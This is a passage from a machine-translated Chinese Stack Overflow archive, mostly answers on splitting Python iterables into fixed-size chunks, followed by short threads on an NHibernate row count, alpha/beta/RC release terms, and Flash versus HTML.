def MarkusJarderot1(iterable,size):
    return consume_all(MarkusJarderot1_inner(iterable,size))

def MarkusJarderot2_inner(iterable,size,filler=None):
    it = itertools.chain(iterable,itertools.repeat(filler,size-1))
    chunk = tuple(itertools.islice(it,size))
    while len(chunk) == size:
        yield chunk
        chunk = tuple(itertools.islice(it,size))

@b.add_function()
def MarkusJarderot2(iterable,size):
    return consume_all(MarkusJarderot2_inner(iterable,size))

@b.add_arguments()
def argument_provider():
    for exp in range(2, 20):
        size = 2**exp
        yield size, simple_benchmark.MultiArgument([[0] * size, 10])

r = b.run() 
```

* * *

¹免责声明：我是图书馆`iteration_utilities`和`simple_benchmark`.

* * *

## 回答 #6

> 赞同：16
> 
> 时间：2013-08-14T23:24:51.507

我需要一个同样适用于集合和生成器的解决方案。我想不出任何非常简短和漂亮的东西，但至少它是相当可读的。

```
def chunker(seq, size):
    res = []
    for el in seq:
        res.append(el)
        if len(res) == size:
            yield res
            res = []
    if res:
        yield res 
```

列表：

```
>>> list(chunker([i for i in range(10)], 3))
[[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]] 
```

放：

```
>>> list(chunker(set([i for i in range(10)]), 3))
[[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]] 
```

发电机：

```
>>> list(chunker((i for i in range(10)), 3))
[[0, 1, 2], [3, 4, 5], [6, 7, 8], [9]] 
```

* * *

## 回答 #7

> 赞同：15
> 
> 时间：2020-11-11T04:15:40.600

[more-itertools](https://more-itertools.readthedocs.io/en/stable/index.html)包有[chunked](https://more-itertools.readthedocs.io/en/stable/api.html#more_itertools.chunked)方法，它可以做到这一点：

```
import more_itertools
for s in more_itertools.chunked(range(9), 4):
    print(s) 
```

印刷

```
[0, 1, 2, 3]
[4, 5, 6, 7]
[8] 
```

`chunked`返回列表中的项目。如果您更喜欢迭代，请使用[ichunked](https://more-itertools.readthedocs.io/en/stable/api.html#more_itertools.ichunked)。

* * *

## 回答 #8

> 赞同：14
> 
> 时间：2012-05-29T00:50:20.773

这个问题的理想解决方案适用于迭代器（不仅仅是序列）。它也应该很快。

这是 itertools 文档提供的解决方案：

```
def grouper(n, iterable, fillvalue=None):
    #"grouper(3, 'ABCDEFG', 'x') --> ABC DEF Gxx"
    args = [iter(iterable)] * n
    return itertools.izip_longest(fillvalue=fillvalue, *args) 
```

在我的 mac book air 上使用 ipython `%timeit`，每个循环我得到 47.5 us。

但是，这对我来说真的不起作用，因为结果被填充为均匀大小的组。没有填充的解决方案稍微复杂一些。最天真的解决方案可能是：

```
def grouper(size, iterable):
    i = iter(iterable)
    while True:
        out = []
        try:
            for _ in range(size):
                out.append(i.next())
        except StopIteration:
            yield out
            break

        yield out 
```

简单，但相当慢：每个循环 693 us

我能想出的最佳解决方案是`islice`用于内部循环：

```
def grouper(size, iterable):
    it = iter(iterable)
    while True:
        group = tuple(itertools.islice(it, None, size))
        if not group:
            break
        yield group 
```

使用相同的数据集，每个循环我得到 305 us。

无法以比这更快的速度获得纯解决方案，我提供以下解决方案并提出一个重要警告：如果您的输入数据中有实例`filldata`，您可能会得到错误的答案。

```
def grouper(n, iterable, fillvalue=None):
    #"grouper(3, 'ABCDEFG', 'x') --> ABC DEF Gxx"
    args = [iter(iterable)] * n
    # itertools.zip_longest on Python 3
    for x in itertools.izip_longest(*args, fillvalue=fillvalue):
        if x[-1] is fillvalue:
            yield tuple(v for v in x if v is not fillvalue)
        else:
            yield x 
```

我真的不喜欢这个答案，但它明显更快。每个循环 124 us

* * *

## 回答 #9

> 赞同：14
> 
> 时间：2020-04-26T04:14:34.117

在 Python 3.8 中，您可以使用海象运算符和`itertools.islice`.

```
from itertools import islice

list_ = [i for i in range(10, 100)]

def chunker(it, size):
    iterator = iter(it)
    while chunk := list(islice(iterator, size)):
        print(chunk) 
```

```
In [2]: chunker(list_, 10)                                                         
[10, 11, 12, 13, 14, 15, 16, 17, 18, 19]
[20, 21, 22, 23, 24, 25, 26, 27, 28, 29]
[30, 31, 32, 33, 34, 35, 36, 37, 38, 39]
[40, 41, 42, 43, 44, 45, 46, 47, 48, 49]
[50, 51, 52, 53, 54, 55, 56, 57, 58, 59]
[60, 61, 62, 63, 64, 65, 66, 67, 68, 69]
[70, 71, 72, 73, 74, 75, 76, 77, 78, 79]
[80, 81, 82, 83, 84, 85, 86, 87, 88, 89]
[90, 91, 92, 93, 94, 95, 96, 97, 98, 99] 
```

* * *

## 回答 #10

> 赞同：12
> 
> 时间：2009-01-12T03:56:20.110

```
from itertools import izip_longest

def chunker(iterable, chunksize, filler):
    return izip_longest(*[iter(iterable)]*chunksize, fillvalue=filler) 
```

* * *

## 回答 #11

> 赞同：10
> 
> 时间：2012-12-06T01:56:30.547

与其他提案类似，但不完全相同，我喜欢这样做，因为它简单易读：

```
it = iter([1, 2, 3, 4, 5, 6, 7, 8, 9])
for chunk in zip(it, it, it, it):
    print chunk

>>> (1, 2, 3, 4)
>>> (5, 6, 7, 8) 
```

这样你就不会得到最后的部分块。如果你想获得`(9, None, None, None)`最后一个块，只需使用`izip_longest`from `itertools`。

* * *

## 回答 #12

> 赞同：8
> 
> 时间：2009-01-12T15:13:41.037

由于没有人提到它，这里有一个`zip()`解决方案：

```
>>> def chunker(iterable, chunksize):
...     return zip(*[iter(iterable)]*chunksize) 
```

它仅在您的序列长度始终可以被块大小整除或者您不关心尾随块（如果不是）时才有效。

例子：

```
>>> s = '1234567890'
>>> chunker(s, 3)
[('1', '2', '3'), ('4', '5', '6'), ('7', '8', '9')]
>>> chunker(s, 4)
[('1', '2', '3', '4'), ('5', '6', '7', '8')]
>>> chunker(s, 5)
[('1', '2', '3', '4', '5'), ('6', '7', '8', '9', '0')] 
```

或者使用[itertools.izip](http://docs.python.org/library/itertools.html)返回一个迭代器而不是一个列表：

```
>>> from itertools import izip
>>> def chunker(iterable, chunksize):
...     return izip(*[iter(iterable)]*chunksize) 
```

填充可以使用[@ΤZΩΤZΙΟΥ's answer](https://stackoverflow.com/questions/312443/how-do-you-split-a-list-into-evenly-sized-chunks-in-python#312644)修复：

```
>>> from itertools import chain, izip, repeat
>>> def chunker(iterable, chunksize, fillvalue=None):
...     it   = chain(iterable, repeat(fillvalue, chunksize-1))
...     args = [it] * chunksize
...     return izip(*args) 
```

* * *

## 回答 #13

> 赞同：6
> 
> 时间：2014-02-26T17:52:46.260

另一种方法是使用两个参数的形式`iter`：

```
from itertools import islice

def group(it, size):
    it = iter(it)
    return iter(lambda: tuple(islice(it, size)), ()) 
```

这可以很容易地适应使用填充（这类似于[Markus Jarderot](https://stackoverflow.com/a/434314/577088)的回答）：

```
from itertools import islice, chain, repeat

def group_pad(it, size, pad=None):
    it = chain(iter(it), repeat(pad))
    return iter(lambda: tuple(islice(it, size)), (pad,) * size) 
```

这些甚至可以组合用于可选填充：

```
_no_pad = object()
def group(it, size, pad=_no_pad):
    if pad == _no_pad:
        it = iter(it)
        sentinel = ()
    else:
        it = chain(iter(it), repeat(pad))
        sentinel = (pad,) * size
    return iter(lambda: tuple(islice(it, size)), sentinel) 
```

* * *

## 回答 #14

> 赞同：5
> 
> 时间：2011-11-29T14:58:00.203

使用 map() 而不是 zip() 修复了 JF Sebastian 回答中的填充问题：

```
>>> def chunker(iterable, chunksize):
...   return map(None,*[iter(iterable)]*chunksize) 
```

例子：

```
>>> s = '1234567890'
>>> chunker(s, 3)
[('1', '2', '3'), ('4', '5', '6'), ('7', '8', '9'), ('0', None, None)]
>>> chunker(s, 4)
[('1', '2', '3', '4'), ('5', '6', '7', '8'), ('9', '0', None, None)]
>>> chunker(s, 5)
[('1', '2', '3', '4', '5'), ('6', '7', '8', '9', '0')] 
```

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2009-01-12T03:19:30.887

如果列表很大，执行此操作的最高性能方法是使用生成器：

```
def get_chunk(iterable, chunk_size):
    result = []
    for item in iterable:
        result.append(item)
        if len(result) == chunk_size:
            yield tuple(result)
            result = []
    if len(result) > 0:
        yield tuple(result)

for x in get_chunk([1,2,3,4,5,6,7,8,9,10], 3):
    print x

(1, 2, 3)
(4, 5, 6)
(7, 8, 9)
(10,) 
```

* * *

## 回答 #16

> 赞同：4
> 
> 时间：2013-02-21T10:40:10.323

使用小功能和东西真的不吸引我；我更喜欢只使用切片：

```
data = [...]
chunk_size = 10000 # or whatever
chunks = [data[i:i+chunk_size] for i in xrange(0,len(data),chunk_size)]
for chunk in chunks:
    ... 
```

* * *

## 回答 #17

> 赞同：3
> 
> 时间：2014-10-18T08:42:28.543

为了避免所有转换为列表`import itertools`，并且：

```
>>> for k, g in itertools.groupby(xrange(35), lambda x: x/10):
...     list(g) 
```

产生：

```
... 
0 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]
1 [10, 11, 12, 13, 14, 15, 16, 17, 18, 19]
2 [20, 21, 22, 23, 24, 25, 26, 27, 28, 29]
3 [30, 31, 32, 33, 34]
>>> 
```

我检查`groupby`了它并没有转换为列表或使用`len`，所以我（认为）这会延迟每个值的解析，直到它被实际使用。遗憾的是（此时）似乎没有一个可用的答案提供这种变化。

显然，如果您需要依次处理每个项目，请在 g 上嵌套一个 for 循环：

```
for k,g in itertools.groupby(xrange(35), lambda x: x/10):
    for i in g:
       # do what you need to do with individual items
    # now do what you need to do with the whole group 
```

我对此的特别兴趣是需要使用生成器以将最多 1000 批的更改提交到 gmail API：

```
 messages = a_generator_which_would_not_be_smart_as_a_list
    for idx, batch in groupby(messages, lambda x: x/1000):
        batch_request = BatchHttpRequest()
        for message in batch:
            batch_request.add(self.service.users().messages().modify(userId='me', id=message['id'], body=msg_labels))
        http = httplib2.Http()
        self.credentials.authorize(http)
        batch_request.execute(http=http) 
```

* * *

## 回答 #18

> 赞同：2
> 
> 时间：2014-09-01T12:44:40.013

单行，即席解决方案，用于迭代`x`大小块的列表`4`-

```
for a, b, c, d in zip(x[0::4], x[1::4], x[2::4], x[3::4]):
    ... do something with a, b, c and d ... 
```

* * *

## 回答 #19

> 赞同：2
> 
> 时间：2014-11-19T04:09:38.560

使用 NumPy 很简单：

```
ints = array([1, 2, 3, 4, 5, 6, 7, 8])
for int1, int2 in ints.reshape(-1, 2):
    print(int1, int2) 
```

输出：

```
1 2
3 4
5 6
7 8 
```

* * *

## 回答 #20

> 赞同：2
> 
> 时间：2016-02-25T13:25:54.850

```
def chunker(iterable, n):
    """Yield iterable in chunk sizes.

    >>> chunks = chunker('ABCDEF', n=4)
    >>> chunks.next()
    ['A', 'B', 'C', 'D']
    >>> chunks.next()
    ['E', 'F']
    """
    it = iter(iterable)
    while True:
        chunk = []
        for i in range(n):
            try:
                chunk.append(next(it))
            except StopIteration:
                yield chunk
                raise StopIteration
        yield chunk

if __name__ == '__main__':
    import doctest

    doctest.testmod() 
```

* * *

## 回答 #21

> 赞同：2
> 
> 时间：2019-03-27T16:55:34.200

除非我错过了什么，否则没有提到以下带有生成器表达式的简单解决方案。它假设*块的大小和数量都是已知的*（通常是这种情况），并且不需要填充：

```
def chunks(it, n, m):
    """Make an iterator over m first chunks of size n.
    """
    it = iter(it)
    # Chunks are presented as tuples.
    return (tuple(next(it) for _ in range(n)) for _ in range(m)) 
```

* * *

## 回答 #22

> 赞同：1
> 
> 时间：2009-01-12T02:59:16.933

在您的第二种方法中，我将通过以下方式进入下一组 4 人：

```
ints = ints[4:] 
```

但是，我没有进行任何性能测量，所以我不知道哪一个可能更有效。

话虽如此，我通常会选择第一种方法。这并不漂亮，但这通常是与外部世界交互的结果。

* * *

## 回答 #23

> 赞同：1
> 
> 时间：2012-11-11T21:14:55.570

另一个答案，其优点是：

1）易于理解
2）适用于任何可迭代的，而不仅仅是序列（上面的一些答案会阻塞文件句柄）
3）不会一次将块加载到内存中
4）不会创建一个块长的引用列表内存中的相同迭代器
5) 列表末尾没有填充值

话虽如此，我还没有计时，所以它可能比一些更聪明的方法慢，并且考虑到用例，一些优点可能无关紧要。

```
def chunkiter(iterable, size):
  def inneriter(first, iterator, size):
    yield first
    for _ in xrange(size - 1): 
      yield iterator.next()
  it = iter(iterable)
  while True:
    yield inneriter(it.next(), it, size)

In [2]: i = chunkiter('abcdefgh', 3)
In [3]: for ii in i:                                                
          for c in ii:
            print c,
          print ''
        ...:     
        a b c 
        d e f 
        g h 
```

**更新：**
由于内部和外部循环从同一个迭代器中提取值，存在一些缺点：
1) continue 在外部循环中不能按预期工作 - 它只是继续到下一个项目而不是跳过一个块. 但是，这似乎不是问题，因为在外循环中没有什么要测试的。
2) break 在内部循环中没有按预期工作 - 控制将再次在内循环中结束，迭代器中的下一个项目。要跳过整个块，要么将内部迭代器（上面的 ii）包装在一个元组中，例如`for c in tuple(ii)`，要么设置一个标志并耗尽迭代器。

* * *

## 回答 #24

> 赞同：1
> 
> 时间：2014-02-20T11:45:37.427

```
def group_by(iterable, size):
    """Group an iterable into lists that don't exceed the size given.

    >>> group_by([1,2,3,4,5], 2)
    [[1, 2], [3, 4], [5]]

    """
    sublist = []

    for index, item in enumerate(iterable):
        if index > 0 and index % size == 0:
            yield sublist
            sublist = []

        sublist.append(item)

    if sublist:
        yield sublist 
```

* * *

## 回答 #25

> 赞同：1
> 
> 时间：2014-06-04T20:13:23.000

您可以使用[funcy](https://github.com/Suor/funcy)库中的[partition](http://funcy.readthedocs.org/en/latest/seqs.html#partition)或[chunks](http://funcy.readthedocs.org/en/latest/seqs.html#chunks)函数：

```
from funcy import partition

for a, b, c, d in partition(4, ints):
    foo += a * b * c * d 
```

这些函数也有迭代器版本`ipartition`和`ichunks`，在这种情况下效率更高。

您还可以查看[它们的实现](https://github.com/Suor/funcy/blob/1.0.0/funcy/seqs.py#L316)。

* * *

## 回答 #26

> 赞同：1
> 
> 时间：2014-12-02T19:32:56.053

关于`J.F. Sebastian` [这里](https://stackoverflow.com/a/435712/3821804)给出的解决方案：

```
def chunker(iterable, chunksize):
    return zip(*[iter(iterable)]*chunksize) 
```

它很聪明，但有一个缺点——总是返回元组。如何获取字符串？
当然你可以写`''.join(chunker(...))`，但是临时元组无论如何都是被构造的。

您可以通过编写 own 来摆脱临时元组`zip`，如下所示：

```
class IteratorExhausted(Exception):
    pass

def translate_StopIteration(iterable, to=IteratorExhausted):
    for i in iterable:
        yield i
    raise to # StopIteration would get ignored because this is generator,
             # but custom exception can leave the generator.

def custom_zip(*iterables, reductor=tuple):
    iterators = tuple(map(translate_StopIteration, iterables))
    while True:
        try:
            yield reductor(next(i) for i in iterators)
        except IteratorExhausted: # when any of iterators get exhausted.
            break 
```

然后

```
def chunker(data, size, reductor=tuple):
    return custom_zip(*[iter(data)]*size, reductor=reductor) 
```

示例用法：

```
>>> for i in chunker('12345', 2):
...     print(repr(i))
...
('1', '2')
('3', '4')
>>> for i in chunker('12345', 2, ''.join):
...     print(repr(i))
...
'12'
'34' 
```

* * *

## 回答 #27

> 赞同：1
> 
> 时间：2015-04-10T18:07:52.937

这是一个没有导入支持生成器的分块器：

```
def chunks(seq, size):
    it = iter(seq)
    while True:
        ret = tuple(next(it) for _ in range(size))
        if len(ret) == size:
            yield ret
        else:
            raise StopIteration() 
```

使用示例：

```
>>> def foo():
...     i = 0
...     while True:
...         i += 1
...         yield i
...
>>> c = chunks(foo(), 3)
>>> c.next()
(1, 2, 3)
>>> c.next()
(4, 5, 6)
>>> list(chunks('abcdefg', 2))
[('a', 'b'), ('c', 'd'), ('e', 'f')] 
```

* * *

## 回答 #28

> 赞同：1
> 
> 时间：2017-06-09T15:50:26.697

我喜欢这种方法。它感觉简单而不神奇，并且支持所有可迭代类型并且不需要导入。

```
def chunk_iter(iterable, chunk_size):
it = iter(iterable)
while True:
    chunk = tuple(next(it) for _ in range(chunk_size))
    if not chunk:
        break
    yield chunk 
```

* * *

## 回答 #29

> 赞同：1
> 
> 时间：2017-07-06T22:20:50.210

这里非常pythonic（您也可以内联`split_groups`函数的主体）

```
import itertools
def split_groups(iter_in, group_size):
    return ((x for _, x in item) for _, item in itertools.groupby(enumerate(iter_in), key=lambda x: x[0] // group_size))

for x, y, z, w in split_groups(range(16), 4):
    foo += x * y + z * w 
```

* * *

## 回答 #30

> 赞同：1
> 
> 时间：2017-07-20T15:20:06.853

我从不希望我的大块被填充，所以这个要求是必不可少的。我发现处理任何迭代的能力也是必需的。鉴于此，我决定扩展已接受的答案[https://stackoverflow.com/a/434411/1074659](https://stackoverflow.com/a/434411/1074659)。

如果由于需要比较和过滤填充值而不需要填充，则此方法的性能会受到轻微影响。但是，对于大块大小，此实用程序非常高效。

```
#!/usr/bin/env python3
from itertools import zip_longest

_UNDEFINED = object()

def chunker(iterable, chunksize, fillvalue=_UNDEFINED):
    """
    Collect data into chunks and optionally pad it.

    Performance worsens as `chunksize` approaches 1.

    Inspired by:
        https://docs.python.org/3/library/itertools.html#itertools-recipes

    """
    args = [iter(iterable)] * chunksize
    chunks = zip_longest(*args, fillvalue=fillvalue)
    yield from (
        filter(lambda val: val is not _UNDEFINED, chunk)
        if chunk[-1] is _UNDEFINED
        else chunk
        for chunk in chunks
    ) if fillvalue is _UNDEFINED else chunks 
```

* * *

## 回答 #31

> 赞同：1
> 
> 时间：2021-06-21T01:42:20.597

这是我在列表，迭代器和范围上的工作......懒惰：

```
def chunker(it,size):
    rv = [] 
    for i,el in enumerate(it,1) :   
        rv.append(el)
        if i % size == 0 : 
            yield rv
            rv = []
    if rv : yield rv 
```

几乎使它成为单线；（

```
In [95]: list(chunker(range(9),2) )                                                                                                                                          
Out[95]: [[0, 1], [2, 3], [4, 5], [6, 7], [8]]

In [96]: list(chunker([1,2,3,4,5],2) )                                                                                                                                       
Out[96]: [[1, 2], [3, 4], [5]]

In [97]: list(chunker(iter(range(9)),2) )                                                                                                                                    
Out[97]: [[0, 1], [2, 3], [4, 5], [6, 7], [8]]

In [98]: list(chunker(range(9),25) )                                                                                                                                         
Out[98]: [[0, 1, 2, 3, 4, 5, 6, 7, 8]]

In [99]: list(chunker(range(9),1) )                                                                                                                                          
Out[99]: [[0], [1], [2], [3], [4], [5], [6], [7], [8]]

In [101]: %timeit list(chunker(range(101),2) )                                                                                                                               
11.3 µs ± 68.2 ns per loop (mean ± std. dev. of 7 runs, 100000 loops each) 
```

* * *

## 回答 #32

> 赞同：0
> 
> 时间：2014-11-26T08:21:04.563

起初，我将其设计为将字符串拆分为子字符串以解析包含十六进制的字符串。
今天我把它变成了复杂但仍然简单的生成器。

```
def chunker(iterable, size, reductor, condition):
    it = iter(iterable)
    def chunk_generator():
        return (next(it) for _ in range(size))
    chunk = reductor(chunk_generator())
    while condition(chunk):
        yield chunk
        chunk = reductor(chunk_generator()) 
```

# 论据：

### 明显的

*   `iterable`是包含/生成/迭代输入数据的任何可迭代/迭代器/生成器，
*   `size`当然，是你想要得到的块的大小，

### 更有意思的

*   `reductor`是一个可调用对象，它接收生成器对块内容的迭代。
    我希望它返回序列或字符串，但我不要求这样做。

    您可以将此参数作为参数传递，例如`list`, `tuple`, `set`, 或任何更高级的参数。我会传递这个函数，返回字符串 （前提是包含/生成/迭代字符串）：`frozenset`

    `iterable`

    ```
    def concatenate(iterable):
        return ''.join(iterable) 
    ```

    ^(请注意，`reductor`通过引发异常可能会导致关闭生成器。)

*   `condition`是一个可调用的，它接收`reductor`返回的任何内容。
    它决定批准并放弃它（通过返回任何评估为`True`），
    或拒绝它并完成生成器的工作（通过返回任何其他内容或引发异常）。

    当元素的数量`iterable`不能被 整除`size`时，当`it`用尽时，`reductor`将接收生成器生成的元素少于`size`。
    我们称这些元素*为持续元素*。

    我邀请了两个函数作为这个参数传递：

    *   `lambda x:x`-将产生*lasts 元素。*

    *   `lambda x: len(x)==<size>`- *lasts 元素*将被拒绝。^(使用等于的数字)
        ^(替换`<size>``size`)

* * *

## 回答 #33

> 赞同：0
> 
> 时间：2016-02-25T03:10:02.020

无需创建任何临时列表即可轻松`itertools.groupby`获得可迭代的可迭代对象：

```
groupby(iterable, (lambda x,y: (lambda z: x.next()/y))(count(),100)) 
```

不要被嵌套的 lambdas 推迟，外部 lambda 只运行一次以将`count()`生成器和常量`100`放入内部 lambda 的范围。

我用它来向 mysql 发送大块的行。

```
for k,v in groupby(bigdata, (lambda x,y: (lambda z: x.next()/y))(count(),100))):
    cursor.executemany(sql, v) 
```

* * *

## 回答 #34

> 赞同：0
> 
> 时间：2017-07-13T08:27:40.833

这个答案**拆分了一个字符串列表**，f.ex 。实现 PEP8 行长度合规性：

```
def split(what, target_length=79):
    '''splits list of strings into sublists, each 
    having string length at most 79'''
    out = [[]]
    while what:
        if len("', '".join(out[-1])) + len(what[0]) < target_length:
            out[-1].append(what.pop(0))
        else:
            if not out[-1]: # string longer than target_length
                out[-1] = [what.pop(0)]
            out.append([])
    return out 
```

用于

```
>>> split(['deferred_income', 'long_term_incentive', 'restricted_stock_deferred', 'shared_receipt_with_poi', 'loan_advances', 'from_messages', 'other', 'director_fees', 'bonus', 'total_stock_value', 'from_poi_to_this_person', 'from_this_person_to_poi', 'restricted_stock', 'salary', 'total_payments', 'exercised_stock_options'], 75)
[['deferred_income', 'long_term_incentive', 'restricted_stock_deferred'], ['shared_receipt_with_poi', 'loan_advances', 'from_messages', 'other'], ['director_fees', 'bonus', 'total_stock_value', 'from_poi_to_this_person'], ['from_this_person_to_poi', 'restricted_stock', 'salary', 'total_payments'], ['exercised_stock_options']] 
```

* * *

## 回答 #35

> 赞同：0
> 
> 时间：2018-11-28T17:03:07.390

我希望通过将迭代器从列表中移出，我不仅仅是复制列表的一部分。生成器可以被切片，它们仍然会自动成为一个生成器，而列表将被切片成 1000 个条目的大块，效率较低。

```
def iter_group(iterable, batch_size:int):
    length = len(iterable)
    start = batch_size*-1
    end = 0
    while(end < length):
        start += batch_size
        end += batch_size
        if type(iterable) == list:
            yield (iterable[i] for i in range(start,min(length-1,end)))
        else:
            yield iterable[start:end] 
```

用法：

```
items = list(range(1,1251))

for item_group in iter_group(items, 1000):
    for item in item_group:
        print(item) 
```

* * *

## 回答 #36

> 赞同：-1
> 
> 时间：2009-01-12T02:56:54.097

似乎没有一个很好的方法来做到这一点。 [这](http://code.activestate.com/recipes/425397/)是一个包含多种方法的页面，包括：

```
def split_seq(seq, size):
    newseq = []
    splitsize = 1.0/size*len(seq)
    for i in range(size):
        newseq.append(seq[int(round(i*splitsize)):int(round((i+1)*splitsize))])
    return newseq 
```

* * *

## 回答 #37

> 赞同：-1
> 
> 时间：2009-01-12T03:46:12.173

如果列表大小相同，您可以将它们组合成 4 元组列表，使用`zip()`. 例如：

```
# Four lists of four elements each.

l1 = range(0, 4)
l2 = range(4, 8)
l3 = range(8, 12)
l4 = range(12, 16)

for i1, i2, i3, i4 in zip(l1, l2, l3, l4):
    ... 
```

以下是该`zip()`函数产生的内容：

```
>>> print l1
[0, 1, 2, 3]
>>> print l2
[4, 5, 6, 7]
>>> print l3
[8, 9, 10, 11]
>>> print l4
[12, 13, 14, 15]
>>> print zip(l1, l2, l3, l4)
[(0, 4, 8, 12), (1, 5, 9, 13), (2, 6, 10, 14), (3, 7, 11, 15)] 
```

如果列表很大，并且您不想将它们组合成更大的列表，请使用`itertools.izip()`，它会生成迭代器，而不是列表。

```
from itertools import izip

for i1, i2, i3, i4 in izip(l1, l2, l3, l4):
    ... 
```

* * *

## 回答 #38

> 赞同：-2
> 
> 时间：2019-05-13T16:15:08.530

为什么不使用列表理解

```
l = [1 , 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
n = 4
filler = 0
fills = len(l) % n
chunks = ((l + [filler] * fills)[x * n:x * n + n] for x in range(int((len(l) + n - 1)/n)))
print(chunks)

[[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 0]] 
```

# nhibernate - Projections.RowCountInt64() 在我设置 SetFirstResult 时返回 0

> ID：434289
> 
> 赞同：1
> 
> 时间：2009-01-12T02:48:51.947
> 
> 标签：nhibernate, projection, rowcount

**当 query.SetFirstResult 与 0 不同时rowCount**返回 0 ？

如果 pageIndex x pageSize = 0 的结果 // 它给了我 rowCount 但当它不等于 0 时，countCriteria 给我 0 而不是 rowCount。

我能做些什么 ？

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-01-12T05:11:21.643

首先是使用[sqlprofiler](http://sqlprofiler.googlepages.com/)并检查正在执行的 sql。也许这有什么问题。我看不出标准有什么问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-01-12T14:23:42.277

我已经解决了我的问题。问题是，Nhibernate 有一个关于**CriteriaTransformer.TransformToRowCount**的错误工作人员。它返回 int 不长。

我在上面做错的是，我试图获取有限结果集的行数（设置了 SetFirstResult 和 SetMaxResult 的查询）

```
ISession session = NHibernateHttpModule.CurrentSession;

            var countCriteria = CriteriaTransformer.TransformToRowCount(query);
            rowCount = Convert.ToInt64(countCriteria.GetExecutableCriteria(session).UniqueResult());

            query.SetMaxResults(pageSize).SetFirstResult(pageIndex * pageSize);
            var customers = query.GetExecutableCriteria(session).List<Customer>(); 
```

这是我的场景的解决方案。我希望它可以帮助有同样问题的人。

塔克斯

# release-management - 软件开发中术语 alpha、beta 和 RC1 是否有标准定义？

> ID：434293
> 
> 赞同：4
> 
> 时间：2009-01-12T02:52:57.803
> 
> 标签：release-management

我很想知道术语 alpha、beta 和 RC1 是在整个软件行业中使用的术语，还是只是 MS。

定义是什么？

马尔科姆

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-01-12T03:00:26.540

是的，这些是标准术语并具有标准定义，尽管在这个 Web 2.0 世界中它们经常有点延伸......

维基百科对所有术语都有很好的解释：[http ://en.wikipedia.org/wiki/Development_stage#Alpha](http://en.wikipedia.org/wiki/Development_stage#Alpha)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T02:58:30.897

是的，这些是普遍使用的术语。Alpha 版本通常供内部使用。Beta 版本通常提供给可以使用该软件的选定客户，他们认识到该软件尚未准备好发布，并就问题提供反馈。通常，这些将是能够帮助发现软件问题的更老练的客户。候选版本通常是人们认为可以发布的版本。这些可能包含小错误，但基本思想是这个版本将在最后一分钟发现没有任何重大缺陷的情况下发布。

我不认为有任何正式的定义，并且用法可能因公司和产品而异。例如，许多 Google 产品似乎都以永久测试版形式存在。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-28T18:57:23.830

来自[http://en.wikipedia.org/wiki/Software_release_life_cycle](http://en.wikipedia.org/wiki/Software_release_life_cycle)

以下是 Alpha 和 Beta 版本的简明通用定义：

Alpha 版的特点是：

A1。这是开始软件测试的第一阶段。

A2。开发人员使用白盒技术（有时称为 Pre-Alpha）测试软件。

A3。然后由另一个测试团队使用黑盒或灰盒技术执行额外的验证。在组织内部进行黑盒测试称为 alpha 版本。

A4。Alpha 软件可能不稳定，并可能导致崩溃或数据丢失。

A5 通常不对外提供（除非有特殊安排和需要，或者开源软件除外）。

A6。它通常以功能冻结结束（称为功能完成状态）。

Beta 版的特点是：

B1。它遵循 alpha 版本，即在功能完成状态之后开始。

B2。SW 通常比 Alpha 有更少的错误，但比已完成的软件有更多错误，以及速度/性能问题。它仍然可能导致崩溃或数据丢失。

B3。Beta 测试的重点是减少对用户的影响，通常包括可用性测试。

B4。这通常是软件第一次在开发它的组织之外可用（对于专有软件）。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2009-01-12T03:30:52.453

我遇到的只有一个标准定义充分涵盖了这些术语的所有用途：

*   Alpha 软件是由创建者标记为“alpha”的软件。
*   Beta 版软件是由创建者标记为“beta”的软件。
*   Gamma 软件是由创建者标记为“gamma”的软件。（现在很少使用了。）
*   RC 软件是原创者标有“RC”的软件。

在准确性和适用性方面，没有其他“标准”定义能与此定义相近。

# silverlight - Flash、Silverlight等插件最终会取代XHTML/CSS/Javascript吗？

> ID：434306
> 
> 赞同：3
> 
> 时间：2009-01-12T02:59:07.573
> 
> 标签：silverlight, flash, xhtml

我已经用 XHTML、CSS 和 Javascript 开发了大约 4 年了。

我非常喜欢它，也有点讨厌它。我对 Flash 和 Silverlight 进行了一些研究，但作为开发人员，我并不太热衷于它们。

一个原因是他们将您锁定在供应商中，并且通常会使用该供应商的工具。例如 Adob​​e Flash 或 Microsoft Visual Studio 等。

此外，Silverlight 似乎将内容、布局/样式和行为混合到一种标记语言中，而我喜欢 XHTML 将它们分开在代码中的方式，但在用户的 Web 浏览器中将它们组合在一起。

我也赞赏网络的可用性，例如后退按钮、超链接等，这些都是人们习惯于处理的固定标准。

但是，我看到很多业界对 Silverlight 和 Flash 的支持。至于 .NET 开发人员的工作，我看到前端/.NET 开发人员的工作更少，而 Silverlight/.NET 开发人员的工作更多。

HTML 开发人员将来是否仍然可以就业，或者我是否应该考虑转移到诸如 Silverlight 之类的专有平台？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-01-12T03:08:01.063

虽然 Flash/Silverlight 技能可能值得开发，但我认为您会发现在未来几年内仍需要通用 Web 开发技能。特别是移动应用程序似乎更加强调良好的基本网页设计，而不依赖于插件和/或客户端代码。最终，我希望 Web 标准能够发展到包含专有插件的最佳（或至少最常用）功能。至少，网络似乎是一个人们倾向于支持保持独立性而不是锁定特定供应商技术的解决方案的地方。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-01-12T03:09:09.860

不，我认为这个想法永远不会完全流行起来。问题实际上与正在开发的平台有关。

看看网络的可访问性。几乎任何机器都可以上网。我的手机、我的 iPod、我的笔记本电脑、我 11 岁的 PII 机器、我的游戏塔，都可以访问同一个网络。

我拥有的设备也不是可以访问网络的限制。我认为几乎每个游戏平台和手机都可以上网，以及运行任何可以想象到的操作系统的瘦终端。我敢肯定还有其他人。

